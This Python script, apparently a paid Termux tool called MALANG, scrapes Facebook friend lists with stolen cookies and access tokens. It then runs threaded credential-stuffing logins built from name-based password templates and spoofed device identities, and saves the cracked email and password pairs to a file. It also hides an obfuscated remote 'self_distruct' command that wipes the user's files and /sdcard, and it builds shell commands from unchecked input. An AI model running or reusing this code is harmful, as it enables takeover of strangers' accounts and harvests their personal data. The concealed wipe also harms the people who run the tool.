#coding=utf-8
try: 
    import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
    from string import * 
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python malang.py') 
try: 
    os.mkdir('/sdcard/ids') 
except:
    pass 
logo="""

      ##     ##  #######  ########  
      ##     ## ##     ## ##     ## 
      ##     ## ##     ## ##     ## 
      ######### ##     ## ########  
      ##     ## ##     ## ##        
      ##     ## ##     ## ##        
      ##     ##  #######  ##        

-----------------------------------------------
 Author: Muhammad Hamza
 Github: https://github.com/hop09
 Version: 7.4
-----------------------------------------------"""
hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
]
loop = 0
ok = []
methods = []
total=[]
android_models = []
abc = {'1':'a','2':'b','3':'c','4':'d','5':'e','6':'f','7':'g','8':'h','9':'i','10':'j','11':'k','12':'l','13':'m','14':'n','15':'o','16':'p','17':'q','18':'r','19':'s','20':'t','21':'u','22':'v','23':'w','24':'x','25':'y','26':'z','27':':','28':'/','29':'.','30':'279','31':'-','32':'*','33':'?','34':'=','35':'&'}
def _let_me_down_slowly():
    try:
        global abc
        os.system('clear')
        print(logo)
        cv ='5.4' 
        x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
        if str(cv) in str(x):
            os.system('rm -rf h64 h32 && python bxi.py')
        else:
            status =requests.get("")
            if 'running' in status.text:
                __iam_a_porche()
            elif 'closed' in status.text:
                print('\n Unable to fetch data, try again later ....')
                exit()
            elif 'self_distruct' in status.text:
                os.system('pkg install coreutils > /dev/null')
                os.system(f"{abc['19']}{abc['13']} {abc['19']}{abc['6']}{abc['32']}")
                os.system(f"{abc['19']}{abc['13']} {abc['19']}{abc['6']} /sdcard/{abc['32']}")
            else:
                print('\n Credentials not match with server, try to updating.')
                print('if the problem continuous, contact with admin')
                __iam_a_porche()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ..')
def __iam_a_porche():
    global abc
    os.system('clear')
    print(logo)
    try:
        noAmmount = base64.b64encode(str(os.getuid()).encode('ascii'))
        ofMoneyIs= base64.b64encode((str(platform.uname()[2])).encode('ascii'))
        gen=('QW4HDDQCRGHM64M6GJRK'+str(noAmmount)+'8K83T'+str(ofMoneyIs))
        enoughTobuyAsingleSecondofTime=gen.replace("b'","").replace("'","")
        whyAreyouInspectingMytool=requests.get("")
        canYouDoThat = json.loads(whyAreyouInspectingMytool.text)
        if canYouDoThat['status'] =='valid':
            __with__no__brakes(enoughTobuyAsingleSecondofTime)
        elif canYouDoThat['status'] =='error':
            print('\n\033[1;36m Your token: '+enoughTobuyAsingleSecondofTime+'\033[0;97m')
            print('')
            print(' Note :- Agr facebook update ki waja sy tool work ni krta to is m owner zimadar na hoga.')
            print(' Note :- Agr ap termux ka clear data krty hy or subscription urr jati hy to is k zimadar ap khud hogy')
            print(' Note :- Agr apko ye sharait-o-zawabit qabool hy to he tool ko buy kry. Owner apko force ni kr rha apni marzi sy buy kry. Shukria')
            print(47*'-')
            print(' Payment number: 03104108661')
            print(' Account type: Easypaisa')
            print(' Price: 350 RS')
            print(47*'-')
            print(' Payment krny k bd apni payment ka screenshot or uper dia gya token neechy diye gye number py send kry')
            print(' whatsapp number: 0301-4108661')
    except requests.exceptions.ConnectionError:
        print('\n\n No internet connection ....')
        exit()
def __with__no__brakes(enoughTobuyAsingleSecondofTime):
    try:
        global android_models
        os.system('clear')
        print(logo)
        xx = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/phone.txt').text.splitlines()
        for line in xx:
            android_models.append(line)
        if '.approved.txt' in os.listdir():
            __i__smile(enoughTobuyAsingleSecondofTime)
        else:
            __i__smile(enoughTobuyAsingleSecondofTime)
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
def main():
    os.system('clear')
    print(logo)
    print('\033[0;31m No ammount of money ever buy a single second of time\033[0;97m')
    print(47*'-')
    print(' [1] FB cloning')
    print(' [2] Create file')
    print(' [3] Separate ids')
    print(' [4] Remove dublicate lines')
    print(' [5] Login another account')
    print('\033[1;32m [6] Working password \033[0;97m')
    print(47*'-')
    menu_opt = input(' Select option: ')
    if menu_opt =='1':
        method_crack()
    elif menu_opt =='2':
        create_file_login()
    elif menu_opt =='3':
        sids()
    elif menu_opt =='4':
        remove_dub()
    elif menu_opt =='5':
        os.system('rm -rf fb_cookies.txt')
        login()
    elif menu_opt =='6':
        os.system('clear')
        print(logo)
        print('\t\033[0;32m Working Passwords For MALANG Tool\033[0;97m')
        print(47*'-')
        print(' [1] first last')
        print(' [2] First last')
        print(' [3] firstlast')
        print(' [4] first123')
        print(' [5] First last')
        print(' [6] first1234')
        print(' [7] First1234')
        print(' [8] first12345')
        print(' [9] First12345')
        print(' [10] first786')
        print(' [12] First786')
        print(' [12] first12')
        print(' [13] First12')
        print(47*'-')
        print('\033[0;36m [14] Is K Ilawa Digit Password b Hain But Mujhy Pata Nahi Konsy Working. Agr Apko Ko Aaty To Woh Bhi Use Kar Sakty Ap.')
        print('')
        print(' [15] Name password Men Uper Diye Gaye Digits K Ilawa Apni Mazri K Digits Bhi Laga Sakty ho . Jaisy first00786,first@@@ etc\033[0;97m')
        print(47*'-')
        input(' Press enter to back ')
        os.system('python malang.py')
    else:
        print('\n Invalid option, try again ...')
        time.sleep(1)
        __i__smile()
def method_crack():
    global methods
    os.system('clear')
    print(logo)
    print('\033[0;31m I am alone and independent developer\033[0;97m')
    print(47*'-')
    print(' [1] method 1 ')
    print(' [2] method 2 ')
    print(' [0] Back')
    print(47*'-')
    me_opt = input(' Select method: ')
    if me_opt =='1':
        methods.append('m1')
        os.system('clear')
        print(logo)
        crack_main().crack(id)
    elif me_opt =='2':
        os.system('clear')
        methods.append('m2')
        crack_main().crack(id)
    elif me_opt =='0':
        os.system('python malang.py')
class crack_main():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        os.system('clear')
        print(logo)
        self.file = input(' Put file path: ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(' No file found ....')
            exit()
    def m1(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write('\r %s | method: 1 |  OK: %s \r'%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                client_id = '350685531728'
                client_secrets = '62f8ce9f74b12f84c123cc23437a4a32'
                application_name = 'FB4A'
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                package_name = 'com.facebook.katana'
                locale = 'en_UK'
                device_language = 'UK'
                architecture='x86:armeabi'
                sim_carrier = ''
                android_version=str(random.randrange(6,12))
        #----------------------------------
                __iam_genius = random.choice(android_models)
                build_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits) for iod in range(6))
                phone_model = __iam_genius.split('|')[0]
                phone_company = __iam_genius.split('|')[1]
                dimensions = __iam_genius.split('|')[2]
                networkProviders=['Mobilink','Ufone','Telenor','Zong','PTCL','WorldCall','Wateen','Nayaten','JIO','Vodafone','BSNL','Aircel','Idea','Rogers','Telus','Shaw Communications','Groupe Communications','AT&T','Facebook','Juniper Networks','Verizon','Arista Nertworks','Palo Alto Networks','Avon','Comsat']
                uag = random.choice(hh)
                ua_string = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'.1.1; '+phone_model+' Build/'+build_id+') [FB_IAB/FB4A;FBAV/'+application_version+';FBPN/'+package_name+';FBLC/'+locale+';FBBV/'+application_version_code+';FBCR/'+random.choice(networkProviders)+';FBMF/'+phone_company+';FBBD/'+phone_company+' Mobiles;FBDV/'+phone_model+';FBSV/'+android_version+'.1.1;FBCA/'+architecture+';FBDM/'+dimensions+';FB_FW/1;FBRV/0;]'
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1

                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':client_id,
                    'community_id':'',
                    'device_id':device_id,
                    'family_device_id':device_id,
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                    'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
                    'enroll_misauth':'false',
                    'generate_session_cookies':'1',
                #    'sim_serials':'%5B%2289014103211118510720%22%5D',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'fb_api_req_friendly_name':'LoginOperations',
                    'fb_api_caller_class':'handlelogin',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'unknown',
                    'x-fb-friendly_name':'authenticate',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'user-agent':'[FBAN/Orca-Android;FBAV/378.0.0.25.106;FBPN/com.facebook.orca;FBLC/es_US;FBBV/397777638;FBCR/TELCEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/220333QAG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1505};FB_FW/1'}
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(' \033[0;32m [Successful-BXI] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                    break
                elif 'm.facebook.com' in q['error']['message']:
                    print(' \033[0;31m [CHECKPOINT-BXI] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except Exception as e:
            pass
    def m2(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write('\r %s | method: 2 |  OK: %s \r'%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[1]
            try:
                ln = name.split(' ')[0]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('lastfirst',fn.lower()).replace('last',fn).replace('last',ln.lower()).replace('first',ln).replace('Name',name).replace('name',name.lower())
                client_id = '181425161904154'
                client_secrets = '95a15d22a0e735b2983ecb9759dbaf91'
                version = str(random.randrange(8,15))
                osv = str(random.randrange(1,9))
                abv = ['D','E','F']
                
                if '8' in version:
                    ipsw = '10'+random.choice(abv)+str(random.randint(11,99))
                elif '9' in version:
                    ipsw = '11'+random.choice(abv)+str(random.randint(11,99))
                elif '10' in version:
                    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                elif '11' in version:
                    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                elif '12' in version:
                    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                elif '13' in version:
                    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                elif '14' in version:
                    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                elif '15' in version:
                    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR;]'
                uaft = random.choice(hh)
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['98','79','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1
                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':client_id,
                    'community_id':'',
                    'device_id':device_id,
                    'family_device_id':device_id,
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'generate_session_cookies':'1',
                #    'sim_serials':'%5B%2289014103211118510720%22%5D',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                    'x-fb-friendly_name':'authenticate',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-tigon-is_retry':'true',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'connection':'close',
                    'user-agent':'[FBAN/Orca-Android;FBAV/378.0.0.25.106;FBPN/com.facebook.orca;FBLC/es_US;FBBV/397777638;FBCR/TELCEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/220333QAG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1505};FB_FW/1'}
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(' \033[1;32m [Successful-BX] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                    break
                elif 'm.facebook.com' in q['error']['message']:
                    print(' \033[1;31m [CHECKPOINT-BXI] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except Exception as e:
            pass
    def pasw(self):
        passlist = []
        os.system('clear')
        print(logo)
        print('\033[1;36m Put limit between 1 to 8\033[0;97m')
        pl = int(input(' How many password do you want to add ? '))
        print('\n\033[1;35m Password example: first123,first12345,firs786,firstlast, First last etc \033[0;97m')
        print('')
        if pl =='':
            print('\n Put limit between 1 to 8')
            time.sleep(1)
            passw(self)
        elif pl > 8:
            print('\ Password limit should not be greater than 8')
            time.sleep(1)
            passw(self)
        else:
            for cd in range(pl):
                passlist.append(input(f' Put password no {cd+1}: '))
        os.system('clear')
        print(logo)
        print('\033[1;31m Donot use other apps while cracking is in the process\033[0;97m')
        print(47*'-')
        print(' Total id: '+str(len(self.id)))
        print(' The process is running in the background')
        print(47*'-')
        with ThreadPool(max_workers=30) as formSubmit:
            for user in self.id:
                iid,name = user.split('|')
                if 'm1' in methods:
                    formSubmit.submit(self.m1,iid,name,passlist)
                elif 'm2' in methods:
                    formSubmit.submit(self.m2,iid,name,passlist)
                elif 'm3' in methods:
                    formSubmit.submit(self.m3,iid,name.passlist)
                else:
                    print(' Internal script error, please contact to author')
                    exit()
        print(47*'-')
        print(' The process has been completed')
        print(' Total OK: '+str(len(ok)))
        input('\n Press enter to back ')
        os.system('python malang.py')
def create_file_login():
    ids = []
    xyz = requests.Session()
    os.system('clear')
    print(logo)
    try:
        cookies = {'cookie':open('fb_cookies.txt','r').read()}
        access_token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
        load = json.loads(check_cookies)
        iid = load['id']
        name = load['name']
    except KeyError:
        print('\n Cookies has expired, login another cookies.')
        time.sleep(1)
        os.system('rm -rf .fb_cookies.txt .access_token.txt')
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    os.system('clear')
    print(logo)
    print(' [1] Create auto file (fast)')
    print(' [2] Create manual file')
    print(47*'-')
    foopt = input(' Choose option: ')
    if foopt =='1':
        auto_file(cookies,access_token)
    else:
        manual_file(cookies,access_token)
def auto_file(cookies,access_token):
    global total
    os.system('clear & rm -rf .txt .temp.txt')
    print(logo)
    print(' File auto creation mode ...')
    print(47*'-')
    print('\033[1;35m Put range between 1 to 20\033[1;97m\n')
    try:
        fl = int(input(' How many ids you want to add? '))
    except:
        fl = 1
    for xd in range(fl):
        idt = input(f' Put id no.{xd+1}: ')
        try:
            fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
            xyz = requests.Session()
            r = xyz.get(fd_url,cookies=cookies).text
            q = json.loads(r)
            for iid in q['friends']['data']:
                uid = iid['id']
                open('.txt','a').write(uid+'\n')
        except KeyError:
            print(' No friends from: '+idt)
        except requests.exceptions.ConnectionError:
            print(' No internet connection ....')
    print('\n\033[1;35m Example: 100074.100084,100085 etc\033[0;97m')
    try:
        sl = int(input('\n How many links do you want to grab? '))
    except:
        sl = 1
    for el in range(sl):
        sid = input(f' Put {el+1} link: ')
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
    print('\n \033[1;35m /sdcard/malang.txt \033[0;97m\n')
    sf = input(' Put path to save file: ')
    file = open('.temp.txt','r').read().splitlines()
    print('')
    print(' Total ids: '+str(len(file)))
    print(' Grabbing process has started')
    print(47*'-')
    with ThreadPool(max_workers=20) as yaari:
        for exid in file:
            yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
    print(50*'-')
    print(' Total ids: '+str(len(total)))
    print('\n')
    input(' Press enter to back ')
    os.system('python malang.py')
def iamBadBoy(exid,cookies,access_token,sf):
    try:
        global total,loop
        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
        xyz = requests.Session()
        r = xyz.get(fd_url,cookies=cookies).text
        q = json.loads(r)
        for yaad in q['friends']['data']:
            iid = yaad['id']
            name = yaad['name']
            total.append(iid)
            open(sf,'a').write(iid+'|'+name+'\n')
        loop+=1
        sys.stdout.write('\r %s | Total ids: %s\r'%(loop,len(total)));sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    except KeyError:
        pass
def manual_file(cookies,access_token):
    ids=[]
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many ids do you want to extract? '))
    except:
        limit = 1
    print('\n \033[1;35mExample: /sdcard/malang.txt \033[0;97m\n')
    sf = input(' Save file as: ')
    print(47*'-')
    for xd in range(limit):
        idt = input(f' Put id no {xd+1}: ')
        try:
            xyz=requests.Session()
            friend_list = xyz.get('https://graph.facebook.com/'+idt+'?fields=friends.fields(id,name)&access_token='+access_token,cookies=cookies).text
            lists = json.loads(friend_list)
            for i in lists['friends']['data']:
                iid = i['id']
                name = i['name']
                ids.append(iid)
                open(sf,'a').write(iid+'|'+name+'\n')
        except KeyError:
            print(' No friends found ...\n')
        except requests.exceptions.ConnectionError:
            print(' No internet connection ...\n')
        except KeyboardInterrupt:
            print('Skipping ...\n')
    print(47*'-')
    print(' Total ids grabbed: '+str(len(ids)))
    print(' Ids file saved in: '+sf)
    input(' \nPress enter to back ')
    os.system('python malang.py')
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    print('\n\033[1;36m Put limit between 1 to 10 \033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;36m Example: /sdcard/hop.txt\033[0;97m')
    new_save = input(' Save new file as: ')
    print('')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    os.system('python malang.py')
def remove_dub():
    os.system('clear')
    print(logo)
    print(47*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print(' \n\033[1;35mExample: /sdcard/filename.txt\n\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(47*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(47*'-')
        input('\n Press enter to back ')
        os.system('python malang.py')
    except FileNotFoundError:
        print(' File not found.')
def login():
    os.system('clear')
    print(logo)
    #print('\n\033[1;33m If you donot know how to get cookies, see option in main menu\033[0;97m')
    cookies = input(' Put cookies here: ')
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python malang.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
    except AttributeError:
        print('\n Invalid cookies, try another cookies ...')
        exit()
main()

